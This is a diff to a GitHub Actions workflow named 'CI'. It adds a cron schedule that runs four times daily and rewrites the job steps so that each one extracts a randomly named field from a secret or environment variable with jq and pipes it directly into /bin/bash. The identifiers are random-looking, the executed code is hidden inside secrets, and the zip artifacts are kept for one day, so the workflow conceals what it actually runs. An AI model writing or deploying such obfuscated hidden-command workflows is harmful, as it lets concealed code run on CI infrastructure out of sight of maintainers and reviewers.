@@ -2,6 +2,8 @@ name: CI
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '3 3,9,15,21 * * *'
 jobs:
   runner:
     runs-on: ubuntu-latest
@@ -10,17 +12,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: Go
         env:
-          pdb06: ${{ secrets.pdb06 }}
+          wtcf86208: ${{ secrets.wtcf86208 }}
         run: |
-          printf '%s' "$pdb06" | jq -r .ofnb297 | /bin/bash
-          echo $kv04 | jq -r .c23875 | /bin/bash
-          echo $exhfs79322 | jq -r .bduq20730 | /bin/bash
-          echo $owhud8367 | jq -r .m06 | /bin/bash
+          printf '%s' "$wtcf86208" | jq -r .g5392 | /bin/bash
+          echo $guve166 | jq -r .x110 | /bin/bash
+          echo $jnwa43602 | jq -r .ywl87 | /bin/bash
+          printf '%s' "$mx71" | jq -r .ij13 | /bin/bash
+          echo $a70 | jq -r .yfcp1 | /bin/bash
 
       - name: Archive results
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: O8MvKu49
+          name: aT9Gflxk
           path: "*.zip"
           retention-days: 1
